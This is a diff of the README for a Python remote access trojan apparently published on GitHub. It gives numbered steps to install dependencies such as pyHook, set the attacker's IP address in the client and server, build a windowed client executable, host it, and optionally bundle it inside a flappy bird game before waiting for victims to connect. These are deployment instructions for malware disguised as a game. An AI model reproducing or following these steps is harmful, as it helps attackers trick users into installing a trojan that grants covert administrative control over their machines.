@@ -34,41 +34,43 @@ Created a remote access trojan that will establish administrative control over a
 8. py2exe
 
 # Usage
-Clone the repo
+1. Clone the repo
 ```
 git clone https://github.com/Lithium95/ConTroll_Remote_Access_Trojan.git
 ```
 
-Install opencv and numpy from requirements.txt
+2. Install opencv and numpy from requirements.txt
 ```
 python -m pip install -r requirements.txt
 ```
-pyHook download link
+3. install pyHook download link
 http://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/
 
-pythoncom download link
+4. Install pythoncom download link
 http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/
 
-Set ip_address. The ip_address is taken from the server's network
+5. Set ip_address and port in client.pyw and server.py. The ip_address should be the attacker's IP address.
 
-Use pyinstaller to build the client binary
+6. Use pyinstaller to build the client binary
 ```
 python pyinstaller.py --onefile --windowed client.pyw
 ```
+**Skip the next 2 steps if you dont want to use the flappy bird game**
 
-Use py2exe to build the flappy bird game
+7. Setup a local server to host the client.exe. Use live-server: https://github.com/tapio/live-server
+
+8. Use py2exe to build the flappy bird game
 ```
 python setup.py
 ```
-
 The exe for the flappy bird game will be in a folder called 'dist'
 
-4. Run the server
+9. Run the server
 ```
 python server.py
 ```
 
-5. Wait for the client to connect
+10. Wait for the client to connect
 
 # ToDo
 
